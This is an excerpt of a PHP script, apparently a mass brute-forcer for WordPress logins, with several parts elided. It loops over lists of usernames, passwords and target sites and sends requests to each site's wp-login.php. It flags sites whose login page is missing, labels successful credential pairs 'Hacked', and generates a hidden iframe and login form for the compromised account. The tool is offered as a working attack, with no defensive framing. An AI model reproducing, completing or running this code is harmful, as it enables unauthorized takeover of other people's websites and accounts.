...
</center></table><p><input type="submit" name="sub" value="<=  Brut Now  =>" /></p></form></div>
<?php 
if($_POST){ 
echo"<table borther=1><tr><td>Addr</td><td>User</td><td>Pass</td><td>Req Type</td><td>Action</td></tr>"; 
...
foreach($u as$U=>$_U){ 
   foreach($p as$P=>$_P){ 
     foreach($s as$S=>$_S){ 
      ...
      if(!th($_S)){ 
        echo"<tr style='color:#F00'><td>".$_S."</td><td>N/A</td><td>N/A</td><td>Error URL !</td><td>N/A</td></tr>"; 
        ob_flush();flush(); 
        $s[$S]='NULL'; 
        continue; 
      } 
      ...
      curl_close($bt); 
      if($N==404){ 
        echo"<tr style='color:#F00'><td>".$_S."wp-login.php</td><td>N/A</td><td>N/A</td><td>Login No Found !</td><td>404</td></tr>"; 
        ob_flush();flush(); 
        $s[$S]='NULL'; 
        continue; 
      } 
...
echo'<iframe src="'.$_S.'wp-admin" style="width:0;height:0;border:0;border:none;"></iframe>'; 
        ob_flush();flush(); 
echo"<tr style='color:#0F0'><td>".$_S."</td><td>".$_U."</td><td>".$_P."</td><td>Hacked</td><td> 
<form target=_blank action='".$_S."wp-login.php' method=POST><input type=hidden name=log value=".$_U." />
